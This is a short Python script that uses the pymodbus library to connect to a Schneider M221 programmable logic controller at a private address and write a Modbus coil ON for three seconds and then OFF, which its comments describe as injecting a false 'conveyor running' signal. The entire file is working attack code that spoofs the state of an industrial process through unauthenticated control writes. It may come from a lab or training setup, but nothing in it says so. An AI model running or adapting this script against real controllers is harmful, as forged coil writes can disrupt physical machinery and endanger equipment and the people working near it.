from pymodbus.client import ModbusTcpClient
import time

# Inject false "conveyor running" signal to Schneider M221
client = ModbusTcpClient("192.168.50.30", port=502)
client.connect()

print("Injecting false coil write to M221 (coil 0 = ON)")
client.write_coil(0, True, slave=1)
time.sleep(3)
client.write_coil(0, False, slave=1)
print("Injection complete")
client.close()